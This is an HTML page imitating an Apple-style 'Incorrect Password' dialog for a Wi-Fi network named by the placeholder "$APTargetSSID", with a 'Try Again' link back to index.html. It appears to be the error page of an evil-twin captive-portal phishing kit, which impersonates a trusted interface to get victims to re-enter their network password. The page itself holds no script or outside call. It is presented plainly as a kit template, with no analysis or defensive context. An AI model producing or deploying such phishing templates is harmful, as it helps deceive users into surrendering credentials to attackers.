<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Incorrect Password</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
      background: linear-gradient(180deg, #e8e8ed 0%, #d2d2d7 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding-top: 60px;
    }

    .modal-overlay {
      width: 100%;
      max-width: 400px;
      padding: 0 20px;
    }

    .modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 14px;
      overflow: hidden;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
    }

    .modal-body {
      padding: 32px 24px;
      text-align: center;
    }

    .error-icon {
      width: 60px;
      height: 60px;
      margin: 0 auto 20px;
      background: #ff3b30;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .error-icon svg {
      width: 30px;
      height: 30px;
      stroke: white;
      stroke-width: 3;
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      color: #000;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 14px;
      color: #6e6e73;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .btn-retry {
      display: inline-block;
      background: #007aff;
      color: white;
      padding: 12px 32px;
      border-radius: 10px;
      text-decoration: none;
      font-size: 17px;
      font-weight: 500;
    }
  </style>
</head>
<body>
  <div class="modal-overlay">
    <div class="modal">
      <div class="modal-body">
        <div class="error-icon">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M6 6L18 18M6 18L18 6" stroke-linecap="round"/>
          </svg>
        </div>
        <h1 class="title">Incorrect Password</h1>
        <p class="subtitle">The password you entered for "$APTargetSSID" is incorrect. Please try again.</p>
        <a href="index.html" class="btn-retry">Try Again</a>
      </div>
    </div>
  </div>
</body>
</html>
